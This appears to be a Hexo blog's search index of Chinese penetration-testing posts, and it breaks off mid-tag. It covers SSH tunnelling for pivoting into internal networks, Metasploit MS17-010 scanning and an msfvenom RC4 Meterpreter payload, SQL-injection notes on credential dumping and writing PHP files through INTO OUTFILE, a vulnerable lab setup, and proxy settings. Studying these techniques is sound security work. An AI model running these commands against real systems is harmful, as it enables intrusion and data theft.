<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>SSH隧道介绍与实战</title>
      <link href="/2020/03/08/ssh-sui-dao-jie-shao-yu-shi-zhan/"/>
      <url>/2020/03/08/ssh-sui-dao-jie-shao-yu-shi-zhan/</url>
      
        <content type="html"><![CDATA[<h2 id="SSH隧道介绍与实战"><a href="#SSH隧道介绍与实战" class="headerlink" title="SSH隧道介绍与实战"></a><center>SSH隧道介绍与实战</center></h2><hr><h2 id="0x01-SSH隧道简介"><a href="#0x01-SSH隧道简介" class="headerlink" title="0x01 SSH隧道简介"></a>0x01 SSH隧道简介</h2><p>SSH会自动加密、解密所有SSH客户端和服务端之前的网络数据，还能将其他TCP端口的网络数据通过SSH连接进行转发，并且自动提供了响应的解密服务<br>这一过程称作“SSH隧道(tunneling)”</p><h2 id="0X02-SSH隧道用途"><a href="#0X02-SSH隧道用途" class="headerlink" title="0X02 SSH隧道用途"></a>0X02 SSH隧道用途</h2><p>本地转发、远程转发、动态转发，打通内外网</p><h2 id="0X03-SSH隧道的优势"><a href="#0X03-SSH隧道的优势" class="headerlink" title="0X03 SSH隧道的优势"></a>0X03 SSH隧道的优势</h2><ol><li>加密SSH Client到SSH Server端的数据</li><li>突破防火墙限制，完成一些无法建立TCP的连接（SSH隧道加密传输，C/S模式的架构）</li></ol><h2 id="0X04-SSH隧道前提条件"><a href="#0X04-SSH隧道前提条件" class="headerlink" title="0X04 SSH隧道前提条件"></a>0X04 SSH隧道前提条件</h2><p>服务端配置文件：/etc/ssh/sshd_config  【必要条件】<br>客户端配置文件：/etc/ssh/ssh_config<br>用户配置文件：.ssh/config<br>如下参数开启：</p><pre><code>PasswordAuthentication yes   #开启密码登录AllowTcpForwarding yes       #是否允许TCP转发，默认值=yesGatewayPorts yes             #是否允许远程主机连接本地的转发端口，默认值=no；yes---允许任何人连接到转发端口，若在公网，任何人都可以连接转发端口                             #当为clientspecified   客户端需指定ip。eg：ssh -CfNg -L 1.1.1.1:187:192.168.22.22:22 root@192.168.1.11 -p 80 (意味着只有ip为1.1.1.1的客户端才能连接隧道)TCPKeepAlive yes             #指定系统是否向客户端发送TCP keepalive消息，默认yes，保活，防止ssh断开</code></pre><h2 id="0X05-SSH隧道用到的参数"><a href="#0X05-SSH隧道用到的参数" class="headerlink" title="0X05 SSH隧道用到的参数"></a>0X05 SSH隧道用到的参数</h2><p><img src="1.jpg" alt></p><h2 id="0X06-SSH隧道的种类"><a href="#0X06-SSH隧道的种类" class="headerlink" title="0X06 SSH隧道的种类"></a>0X06 SSH隧道的种类</h2><p> <strong>0X0601</strong>【本地端口转发】，【正向tcp隧道】，多用于从外网能看到victim的ip<br>【命令格式】<br>ssh -CfNg -L Target1上要开放的端口:Target2的IP:Target2的端口 root@Target1的IP  -p 22    </p><p>这里用ssh举例：<br>【Target1】上：（跳板机）<br>开启隧道：ssh -CfNg -L 187:192.168.22.22:22 <a href="mailto:root@192.168.1.11" target="_blank" rel="noopener">root@192.168.1.11</a> -p 22 </p><p><img src="2.jpg" alt></p><p>【attacker】上：验证转发效果</p><p>从attacker[192.168.8.10]上, ssh <a href="mailto:root@192.168.1.11" target="_blank" rel="noopener">root@192.168.1.11</a> -p 187<br>经过ssh隧道，到达了target2[192.168.22.22]</p><p><img src="3.jpg" alt><br>此时【Target1】端口监听情况<br><img src="4.jpg" alt></p><p><strong>0X0602</strong>【远程端口转发】（多用于公网无法通过IP连通Target1的情况）<br>【命令格式】<br>ssh -CfNg -R Target1端口:Target2:Target2端口 root@attacker的ip -p attacker端口</p><p><img src="5.jpg" alt></p><p>【Target1上】<br> ssh -CfNg -R 3389:192.168.22.22:22 <a href="mailto:root@192.168.8.190" target="_blank" rel="noopener">root@192.168.8.190</a> -p 22<br>执行后，本机创建一个ssh隧道到192.168.8.190 端口22</p><p><img src="6.jpg" alt></p><p>【attcker机上】<br>在attacker上，会发现，隧道端口为3389，<br><img src="7.jpg" alt></p><pre><code>注意，这里是监听在127.0.0.1 上，如果想从另外的区域连接attacker的3389 端口，需要将该端口监听到0.0.0.0 地址上。此时用到rinetd【非必选项】若有从更上一层跳转到attacker时，可以使用rinetd，进行端口重定向apt-get install rinetd配置端口映射echo &quot;0.0.0.0 389 127.0.0.1 3389&quot; &gt;&gt; /etc/rinetd.confsystemctl start rinetd</code></pre><p><img src="8.jpg" alt></p><p><img src="9.jpg" alt></p><p>验证隧道情况：<br>可以看到，已经从attacker机上，经过跳板机（Target1）顺利登录Target2机（不出外网）</p><p><img src="10.jpg" alt></p><p>FAQ： 如果从attacker上连接映射隧道端口3389时，出现报错，请检查attacker的/etc/ssh/ssh_config （因为测试attacker作为ssh client 连接隧道服务器（192.168.1.11））</p><h3 id="0X0603【动态端口转发】"><a href="#0X0603【动态端口转发】" class="headerlink" title="0X0603【动态端口转发】"></a>0X0603【动态端口转发】</h3><p>动态端口转发，其实是建立了一个ssh正向加密的socks4/socks5代理通道，任何支持socks4和socks5协议的程序都可以使用这个加密通道来进行网络流量<br>简称：正向加密socks<br>这种比上面的更好玩，可以通过支持socks的程序，将流量经socks端部转发</p><p>新建socks代理命令</p><p>ssh -CfNg -D local_listen_port user@隧道主机IP 隧道端口   #监听127.0.0.1<br>或<br>ssh -CfNg -D 0.0.0.0:local_listen_port  user@tunnel_host tunnel_port    #监听0.0.0.0</p><h2 id="0X07-让我看一个例子："><a href="#0X07-让我看一个例子：" class="headerlink" title="0X07 让我看一个例子："></a>0X07 让我看一个例子：</h2><blockquote><p>SSH隧道+扫描内网主机<br>使用attacker机器上的metasploit，扫描内网Target3机器</p></blockquote><p><img src="11.jpg" alt></p><p>留个5分钟，想想…..如何操作呢？<br><br><br><br><br><br><br><br><br><br><br><br><br>ok，让我们开始</p><p><strong>1：建立反向隧道（较常用）</strong> </p><p><strong>Target1机器上执行：</strong><br>ssh -CfNg -R 1187:192.168.22.22:22 <a href="mailto:root@192.168.8.190" target="_blank" rel="noopener">root@192.168.8.190</a> -p 22  [反向ssh隧道]</p><p><strong>attacker机器上执行：</strong><br>a) 验证隧道：ssh <a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a> -p 1187<br>b) 建立socks代理:  ssh -CfNg -D 0.0.0.0:1287 <a href="mailto:root@127.0.0.1" target="_blank" rel="noopener">root@127.0.0.1</a> -p 1187</p><p><img src="12.jpg" alt></p><p>启动metasploit，并设置socks代理，扫描Target3</p><pre><code>msf5 &gt; setg proxies socks5:127.0.0.1:1287proxies =&gt; socks5:127.0.0.1:1287msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary(scanner/smb/smb_ms17_010) &gt;set rhosts 192.168.33.33msf5 auxiliary(scanner/smb/smb_ms17_010) &gt;set threads 10msf5 auxiliary(scanner/smb/smb_ms17_010)&gt;run</code></pre><p><img src="13.jpg" alt></p><p>ok，是不是很好用呢？嘎嘎！有种深入敌营的感觉</p><h2 id="0X08【双重加密】"><a href="#0X08【双重加密】" class="headerlink" title="0X08【双重加密】"></a>0X08【双重加密】</h2><p>使用“ssh隧道+rc4双重加密” 去链接目标内网下制定机器上的meterpreter</p><blockquote><ol><li>用msfvenom生成bind的rc4 payload，并将rc4.exe 传入目标机器Target3中，并执行(这个得看你如何操作了)<br>msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=GoodGoodStudy lport=443 -f exe -o 1.exe   （-f exe生成windows二进制文件，linux为 -f elf）</li><li>回到metasploit机器上，挂socks代理，启动反弹 shell监听任务。直接bind链接到目标内网中的meterpreter下</li></ol></blockquote><p><strong>注意：如果反弹，因为我们使用的是socks，需要打开反弹经过代理开关。setg ReverseAllowProxy true  否则默认不走代理回弹</strong></p><br><br>用msfvenom生成bind的rc4 payload，并将rc4.exe 传入目标机器Target3中，并执行msfvenom -p windows/meterpreter/bind_tcp_rc4 rc4password=GoodGoodStudy lport=443 -f exe -o 1.exe<p>先拿反弹shell<br>         windows7 机器<br>         use exploit/windows/smb/ms17_010_psexec<br>         set payload windows/meterpreter/bind_tcp_rc4<br>         exploit</p><p><img src="14.jpg" alt></p><p>上传rc4.exe  （exit退出 windows-shell）<br><img src="15.jpg" alt></p><p>接下来测试rc4.exe</p><pre><code>msf5 &gt; setg proxies socks5:192.168.8.190:1287msf5 &gt; setg ReverseAllowProxy truemsf5 &gt; use exploit/multi/handlermsf5 exploit(multi/handler) &gt; set payload windows/meterpreter/bind_tcp_rc4msf5 exploit(multi/handler) &gt; set rc4password GoodGoodStudymsf5 exploit(multi/handler) &gt; set rhost 192.168.33.33msf5 exploit(multi/handler) &gt; set lport 443msf5 exploit(multi/handler) &gt; run -j[*] Exploit running as background job 5.[*] Exploit completed, but no session was created.msf5 exploit(multi/handler) &gt;[*] Started bind TCP handler against 192.168.33.33:443</code></pre><p>此时在windows测运行rc4.exe 机器就会上线<br><img src="16.jpg" alt></p><p><img src="17.jpg" alt></p><hr><h1 id="《免责申明》"><a href="#《免责申明》" class="headerlink" title="《免责申明》"></a>《免责申明》</h1><p><strong>该文章仅限用于技术学习和扩容认知，研究为目的；</strong><br><strong>不得用于非法用途，否则，一切后果用户自负，与本文作者无关</strong></p><!--#### 0x0101 二级标题##### 有序号列表1. aaa2. bbb    + b1    + b2```本地图片 ![描述](当前所在目录的文件夹/1.jpg) ![网络图片](https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png) 指定图片尺寸,用html方式,markdown不支持<img src="https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png" width="50%">插入本地视频<video src="视频名.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"></video>插入外链视频<iframe height=498 width=510 src="视频地址"><iframe height=498 width=510 src="视频地址" frameborder=0 allowfullscreen></iframe>插入音频例如要外链的歌曲https://music.163.com/#/song?id=1357785909该音乐外链地址即为：http://music.163.com/song/media/outer/url?id=1357785909.mp3嵌入代码为：<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1357785909&auto=1&height=66"></iframe></div>```##### 高亮    `heightlight`##### 代码块``` bash/python/html/javascriptecho "Hello world!"print("Hello world")<hr>Hello world</hr><script>    document.write("Hello World！")</script>-->]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSH </tag>
            
            <tag> SSH隧道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>permeate-Web靶场搭建</title>
      <link href="/2020/02/16/permeate-web-ba-chang-da-jian/"/>
      <url>/2020/02/16/permeate-web-ba-chang-da-jian/</url>
      
        <content type="html"><![CDATA[<h2 id="permeate-Web靶场搭建"><a href="#permeate-Web靶场搭建" class="headerlink" title="permeate-Web靶场搭建"></a><center>permeate-Web靶场搭建</center></h2><hr><h2 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 简介"></a>0x01 简介</h2><blockquote><p>目前作者（汤清松）主要用于WEB安全演示教学,也用来自己练习挖掘漏洞 目前发下包含了以下漏洞: 包含sql注入、XSS跨站、CSRF、本地包含等常见的web漏洞 包含密码找回、验证码等逻辑型漏洞 包含git/备份之类文件泄漏 包含图片附件类目录php执行权限 包含webshell上传漏洞<br>项目地址：<a href="https://github.com/78778443/permeate.git" target="_blank" rel="noopener">https://github.com/78778443/permeate.git</a></p></blockquote><h2 id="0x02-安装部署"><a href="#0x02-安装部署" class="headerlink" title="0x02 安装部署"></a>0x02 安装部署</h2><p>靶场有两种部署方式：</p><ol><li>docker部署</li><li>传统web站点方式部署<br>这里使用方式1来部署，简单快捷，节省时间</li></ol><h3 id="0x0201-docker部署"><a href="#0x0201-docker部署" class="headerlink" title="0x0201 docker部署"></a>0x0201 docker部署</h3><blockquote><p>部署前需安装就绪linux+docker 这里不再赘述。别忘记docker配置镜像加速，优势镜像拉取会比较慢</p></blockquote><ul><li>数据库安装</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#数据库安装 注意端口，避免冲突</span>docker pull mysql:5.6docker run --name permeate_db -e MYSQL_ROOT_PASSWORD<span class="token operator">=</span>123456 -d -i -p 13306:3306 mysql:5.6<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>靶场镜像安装</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#靶场web启动</span>docker pull daxia/websafe:latestdocker run --name permeate_vul --link permeate_db:db -d -i -p 1800:80 daxia/websafe:latest<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>靶场web服务启动</li></ul><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#启动容器后，服务需手工启动</span>docker <span class="token function">exec</span> permeate_vul zsh -C <span class="token string">"php /root/start.php"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>打开http://访问linux主机的ip/,配置数据库<br><img src="1.jpg" alt><br><img src="2.jpg" alt><br>部署成功后的样子<br><img src="3.jpg" alt></li></ul><p>接下来，你就可以在这里练手了！</p><!--#### 0x0101 二级标题##### 有序号列表1. aaa2. bbb    + b1    + b2```本地图片 ![描述](当前所在目录的文件夹/1.jpg) ![网络图片](https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png) 指定图片尺寸,用html方式,markdown不支持<img src="https://cache.soso.com/baike/i/logo/unify_logo_1@1x.png" width="50%">插入本地视频<video src="视频名.mp4" controls="controls" style="max-width: 100%; display: block; margin-left: auto; margin-right: auto;"></video>插入外链视频<iframe height=498 width=510 src="视频地址"><iframe height=498 width=510 src="视频地址" frameborder=0 allowfullscreen></iframe>插入音频例如要外链的歌曲https://music.163.com/#/song?id=1357785909该音乐外链地址即为：http://music.163.com/song/media/outer/url?id=1357785909.mp3嵌入代码为：<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1357785909&auto=1&height=66"></iframe></div>```##### 高亮    `heightlight`##### 代码块``` bash/python/html/javascriptecho "Hello world!"print("Hello world")<hr>Hello world</hr><script>    document.write("Hello World！")</script>-->]]></content>
      
      
      <categories>
          
          <category> PenTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker-配置代理</title>
      <link href="/2020/02/12/docker-pei-zhi-dai-li/"/>
      <url>/2020/02/12/docker-pei-zhi-dai-li/</url>
      
        <content type="html"><![CDATA[<h2 id="Docker-配置代理"><a href="#Docker-配置代理" class="headerlink" title="Docker-配置代理"></a><center>Docker-配置代理</center></h2><hr><blockquote><p>在一些实验环境，服务器没有直接连接万网的权限，需要通过网络代理；<br>通常情况下将网络代理直接配置在/etc/envrionment、/etc/profile之类的配置文件中，这对于大部分操作都是可行的。<br>然而，docker命令却不能使用这些代理。最典型场景就是docker需要从外网pull镜像</p><p>推荐一种方法，修改后会一直生效，该方法覆盖了默认的docker.service文件；</p></blockquote><ol><li>为docker服务创建一个内嵌的systemd目录</li></ol><p><code>mkdir -p /etc/systemd/system/docker.service.d</code></p><ol start="2"><li>设置代理</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">touch</span> /etc/systemd/system/docker.service.d/http-proxy.conf文件<span class="token function">vi</span> http-proxy.conf<span class="token punctuation">[</span>Service<span class="token punctuation">]</span>Environment<span class="token operator">=</span><span class="token string">"HTTP_PROXY=http://1.1.1.1:8080/"</span> <span class="token string">"HTTPS_PROXY=https://1.1.1.1:8080/"</span> <span class="token string">"NO_PROXY=localhost,127.0.0.1,docker-registry.somecorporation.com"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>更新配置<pre><code>systemctl daemon-reloadsystemctl restart docker确认设置已生效systemctl show --property=Environment docker</code></pre></li></ol><blockquote><p><code>https://docs.docker.com/config/daemon/systemd/</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git-配置代理</title>
      <link href="/2020/02/12/git-pei-zhi-dai-li/"/>
      <url>/2020/02/12/git-pei-zhi-dai-li/</url>
      
        <content type="html"><![CDATA[<h2 id="Git-配置代理"><a href="#Git-配置代理" class="headerlink" title="Git-配置代理"></a><center>Git-配置代理</center></h2><hr><h3 id="0x01-命令行方式"><a href="#0x01-命令行方式" class="headerlink" title="0x01 命令行方式"></a>0x01 命令行方式</h3><ul><li>临时下载时</li></ul><p><code>git clone -c  http.proxy=http://1.1.1.1:8080   https://github.com/[your project]/[name].git</code></p><ul><li>git配置文件，配置代理</li></ul><pre><code>#set git config --global http.proxy http://1.1.1.1:8080#unset git config --global --unset http.proxy#查看配置是否生效git config --system --list    #查看系统config配置git config --global  --list   #查看当前用户配置git config --local  --list    查看当前仓库配置</code></pre>]]></content>
      
      
      <categories>
          
          <category> Git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入-学习笔记(一)</title>
      <link href="/2020/02/11/sql-zhu-ru-xue-xi-bi-ji-yi/"/>
      <url>/2020/02/11/sql-zhu-ru-xue-xi-bi-ji-yi/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入-学习笔记（一）"><a href="#SQL注入-学习笔记（一）" class="headerlink" title="SQL注入-学习笔记（一）"></a><center>SQL注入-学习笔记（一）</center></h1><blockquote><p>SQL注入核心：<br>1：寻找注入点 （提前闭合sql语句）<br>2：利用注入点，配合一些手段，达到获取敏感数据的目的<br>3：增删改查均可以注入<br>高阶使用，需要想办法绕过安全机制探测注入点和获取数据</p></blockquote><h3 id="联合注入-gt-获取数据库-库名、用户名、版本、表名、列名"><a href="#联合注入-gt-获取数据库-库名、用户名、版本、表名、列名" class="headerlink" title="联合注入-&gt;获取数据库-库名、用户名、版本、表名、列名"></a><center>联合注入-&gt;获取数据库-库名、用户名、版本、表名、列名</center></h3><hr><h4 id="union-select-1-1-1-1-判断表字段个数"><a href="#union-select-1-1-1-1-判断表字段个数" class="headerlink" title="union select 1,1,1,1 判断表字段个数"></a>union select 1,1,1,1 判断表字段个数</h4><ul><li>直到不报错（different number of columns）即能判断个数</li></ul><pre><code>MariaDB [demo]&gt; select * from admin  union select 1;ERROR 1222 (21000): The used SELECT statements have a different number of columnsMariaDB [demo]&gt; select * from admin  union select 1,1;ERROR 1222 (21000): The used SELECT statements have a different number of columnsMariaDB [demo]&gt; select * from admin  union select 1,1,1;ERROR 1222 (21000): The used SELECT statements have a different number of columnsMariaDB [demo]&gt; select * from admin  union select 1,1,1,1;+------+---------+----------+-------------+| id   | name    | password | commint_new |+------+---------+----------+-------------+|    1 | admin   | 123456   | NULL        |+------+---------+----------+-------------+</code></pre><hr><h4 id="union-select-1-1-1-version-查数据库版本"><a href="#union-select-1-1-1-version-查数据库版本" class="headerlink" title="union select 1,1,1 version() 查数据库版本"></a><code>union select 1,1,1 version()</code> 查数据库版本</h4><ul><li>系统函数version() 用于查询当前数据库版本</li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,version();+------+------+----------+-------------------+| id   | name | password | commint_new       |+------+------+----------+-------------------+|    1 | 1    | 1        | 10.3.17-MariaDB-1 |+------+------+----------+-------------------+</code></pre><hr><h4 id="union-select-database-查询数据库名"><a href="#union-select-database-查询数据库名" class="headerlink" title="union select database() 查询数据库名"></a>union select database() 查询数据库名</h4><ul><li>系统函数database() 用于查询当前所使用的数据库名</li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,database();+------+------+----------+-------------+| id   | name | password | commint_new |+------+------+----------+-------------+|    1 | 1    | 1        | demo        |+------+------+----------+-------------+</code></pre><hr><h4 id="union-select-user-查询当前用户名"><a href="#union-select-user-查询当前用户名" class="headerlink" title="union select user() 查询当前用户名"></a>union select user() 查询当前用户名</h4><ul><li>系统函数user() 用于查询当前用户名</li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,database();+------+------+----------+-------------+| id   | name | password | commint_new |+------+------+----------+-------------+|    1 | 1    | 1        | demo        |+------+------+----------+-------------+</code></pre><hr><h4 id="使用系统表information-schema-TABLES-查询当前库的所有表名"><a href="#使用系统表information-schema-TABLES-查询当前库的所有表名" class="headerlink" title="使用系统表information_schema.TABLES 查询当前库的所有表名"></a>使用系统表information_schema.TABLES 查询当前库的所有表名</h4><ul><li>系统表：information_schema.TABLES </li><li>字段名：TABLE_NAME, TABLE_SCHEMA</li><li><code>union select 1,1,TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=database()</code></li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,table_name from information_schema.TABLES where TABLE_SCHEMA=database();+------+------+----------+-------------+| id   | name | password | commint_new |+------+------+----------+-------------+|    1 | 1    | 1        | admin1      ||    1 | 1    | 1        | admin       |+------+------+----------+-------------+MariaDB [demo]&gt; show tables;+----------------+| Tables_in_demo |+----------------+| admin          || admin1         |+----------------+</code></pre><hr><h4 id="使用系统表information-schema-COLUMNS-查询列名"><a href="#使用系统表information-schema-COLUMNS-查询列名" class="headerlink" title="使用系统表information_schema.COLUMNS 查询列名"></a>使用系统表information_schema.COLUMNS 查询列名</h4><ul><li>系统表： information_schema.COLUMNS</li><li>字段名： COLUMN_NAME</li><li><code>union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39;</code> </li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39;;   --admin为前面获取到的数表名+------+------+----------+-------------+| id   | name | password | commint_new |+------+------+----------+-------------+|    1 | 1    | 1        | id          ||    1 | 1    | 1        | name        ||    1 | 1    | 1        | password    ||    1 | 1    | 1        | commint_new |+------+------+----------+-------------+MariaDB [demo]&gt; desc admin;+-------------+-----------+------+-----+---------+-------+| Field       | Type      | Null | Key | Default | Extra |+-------------+-----------+------+-----+---------+-------+| id          | int(11)   | YES  |     | NULL    |       || name        | char(32)  | YES  |     | NULL    |       || password    | char(32)  | YES  |     | NULL    |       || commint_new | char(255) | YES  |     | NULL    |       |+-------------+-----------+------+-----+---------+-------+</code></pre><hr><h4 id="最终查出所有字段及表数据"><a href="#最终查出所有字段及表数据" class="headerlink" title="最终查出所有字段及表数据"></a>最终查出所有字段及表数据</h4><pre><code>MariaDB [demo]&gt; select * from admin where 1=2;Empty set (0.001 sec)MariaDB [demo]&gt; select * from admin where 1=2 union select id,name,password,commint_new from admin;+------+---------+----------+-------------+| id   | name    | password | commint_new |+------+---------+----------+-------------+|    1 | admin   | 123456   | NULL        ||    4 | abc     | 123      | NULL        ||    2 | wang    | s123     | NULL        ||    3 | li      | s123     | NULL        ||    2 | admin2  | 1234567  | asdf        ||    3 | admin3  | 1234567  | wer         ||    4 | admin4  | 1234567  | asdf        ||    5 | admin5  | 1234567  | awerq       ||    6 | admin6  | 1234567  | afh         ||    3 | admin3  | 1234567  | werwer      ||    7 | admin7  | 1234567  | wers        ||    9 | admin9  | 1234567  | asfe        ||    8 | admin8  | 1234567  | swer        ||   10 | admin10 | 1234567  | fgjhgk      ||   11 | admin11 | 1234567  | werer       ||   12 | admin12 | 1234567  | wooij       ||   11 | admin12 | 1234567  | uihnkn      ||   15 | admin15 | 1234567  | werwer      ||   16 | admin16 | 1234567  | 1235        ||   11 | admin   | 1234567  | zxcvdfg     ||    9 | admin9  | 1234567  | hjyutrrty   ||   17 | admin17 | 1234567  | wqerwe      |+------+---------+----------+-------------+</code></pre><h5 id="注-limit-0-1-的巧妙运用，用来获取数据"><a href="#注-limit-0-1-的巧妙运用，用来获取数据" class="headerlink" title="注:limit 0,1 的巧妙运用，用来获取数据"></a>注:limit 0,1 的巧妙运用，用来获取数据</h5><p><img src="1.jpg" alt></p><hr><h2 id="联合注入-gt-导出文件、getshell"><a href="#联合注入-gt-导出文件、getshell" class="headerlink" title="联合注入-&gt;导出文件、getshell"></a><center>联合注入-&gt;导出文件、getshell</center></h2><h4 id="联合注入和文件写入的结合"><a href="#联合注入和文件写入的结合" class="headerlink" title="联合注入和文件写入的结合"></a>联合注入和文件写入的结合</h4><h5 id="导出数据到外部文件"><a href="#导出数据到外部文件" class="headerlink" title="导出数据到外部文件"></a>导出数据到外部文件</h5><ul><li>一般数据库是用非root用户启的，路径会有局限性</li><li>导出文件，默认在mysql的datadir下肯定有写权限  ps -elf|grep mysql 回显中查看 –datadir=/var/lib/mysql</li></ul><ul><li>关键字 sql语句 + into outfile ‘路径/文件名.文件名后缀’</li></ul><h6 id="联合注入实现数据导出到自定义文件-my-txt或my-sql"><a href="#联合注入实现数据导出到自定义文件-my-txt或my-sql" class="headerlink" title="联合注入实现数据导出到自定义文件(my.txt或my.sql)"></a>联合注入实现数据导出到自定义文件<code>(my.txt或my.sql)</code></h6><ul><li>系统关键字 <code>into outfile(&#39;路径+文件&#39;)</code></li><li>文件所在目录有写权限<pre><code>MariaDB [demo]&gt; select &#39;This php code&#39; into outfile &#39;./1.txt&#39;;Query OK, 1 row affected (0.001 sec)root@localhost:/var/lib/mysql# cat 1.txtThis php codeMariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39; into outfile &#39;/root/tmp/my.txt&#39;;ERROR 1 (HY000): Can&#39;t create/write to file &#39;/root/tmp/my.txt&#39; (Errcode: 13 &quot;Permission denied&quot;)MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39; into outfile &#39;./my.txt&#39;;Query OK, 4 rows affected (0.001 sec)root@localhost:root@localhost:/var/lib/mysql# cat my.txt1       1       1       id1       1       1       name1       1       1       password1       1       1       commint_new</code></pre></li></ul><hr><h6 id="联合注入实现代码写脚本格式文件"><a href="#联合注入实现代码写脚本格式文件" class="headerlink" title="联合注入实现代码写脚本格式文件"></a>联合注入实现代码写脚本格式文件</h6><ul><li><code>select &#39;&lt;?php phpinfo() ?&gt;&#39; into outfile &#39;./index.php&#39;</code></li><li>导出数据从数据库通过命令写文件，以实现脚本落地，达到getshell</li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,&#39;&lt;?php phpinfo()?&gt;&#39; into outfile &#39;./index.php&#39;;root@localhost:/var/lib/mysql# cat index.php1       1       1       &lt;?php phpinfo()?&gt;</code></pre><ul><li>高阶使用</li><li>将php代码转成16进制绕过安全机制</li><li><code>&lt;?php phpinfo()?&gt;</code>==&gt; 3c3f70687020706870696e666f28293f3e</li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,0x3c3f70687020706870696e666f28293f3e into outfile &#39;./index.php&#39;;Query OK, 1 row affected (0.001 sec)root@localhost:/var/lib/mysql# cat index.php1       1       1       &lt;?php phpinfo()?&gt;#数据库自己将hex进制转换为ascii码MariaDB [demo]&gt; select 0x3c3f70687020706870696e666f28293f3e;+--------------------------------------+| 0x3c3f70687020706870696e666f28293f3e |+--------------------------------------+| &lt;?php phpinfo()?&gt;                    |+--------------------------------------+</code></pre><hr><h6 id="联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据"><a href="#联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据" class="headerlink" title="联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据"></a>联合注入实现数据写成脚本格式文件，并导出到web服务可访问的目录，实现浏览器读取数据</h6><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select id,name,password,commint_new from admin into outfile &#39;./my.php&#39;;</code></pre><h2 id="联合注入-gt-读取文件"><a href="#联合注入-gt-读取文件" class="headerlink" title="联合注入-&gt;读取文件"></a><center>联合注入-&gt;读取文件</center></h2><h4 id="联合注入和文件读取的结合"><a href="#联合注入和文件读取的结合" class="headerlink" title="联合注入和文件读取的结合"></a>联合注入和文件读取的结合</h4><ul><li>系统函数<code>load_file()</code></li><li>文件所在目录有读权限</li><li>读取文件函数 <code>load_file(&#39;./index.php&#39;)</code></li><li>读取文件转成hex绕过一些安全机制 </li></ul><ul><li><code>load_file(&#39;./index.php&#39;)</code></li><li><code>load_file(0x2e2f696e6465782e706870)</code></li></ul><pre><code>MariaDB [demo]&gt; select * from admin where 1=2 union select 1,1,1,load_file(&#39;./index.php&#39;) from information_schema.COLUMNS where TABLE_NAME=&#39;admin&#39;;+------+------+----------+--------------------------+| id   | name | password | commint_new              |+------+------+----------+--------------------------+|    1 | 1    | 1        | &lt;?php phpinfo()?&gt; |+------+------+----------+--------------------------+MariaDB [demo]&gt; select load_file(0x2e2f696e6465782e706870);+-------------------------------------+| load_file(0x2e2f696e6465782e706870) |+-------------------------------------+| &lt;?php phpinfo()?&gt;                  |+-------------------------------------+</code></pre><hr><h2 id="联合注入-gt-和注释符的联合运用"><a href="#联合注入-gt-和注释符的联合运用" class="headerlink" title="联合注入-&gt;和注释符的联合运用"></a><center>联合注入-&gt;和注释符的联合运用</center></h2><ul><li>mysql注释符有：</li></ul><ul><li><code>#: 在html语言里有#，所以在web端需要将#转编码让浏览器在解析html时不认为是锚点  固要将# 转码为%23 (URL编码\ 见下图</code></li><li>--</li><li>//</li><li>/**/<!--锚点.html 在SQL注入-学习笔记(一)文件夹下--></li></ul><p><img src="2020-02-04-23-37-36.gif" alt="锚点示例"><br><img src="2.jpg" alt="#转码为%23"></p><h2 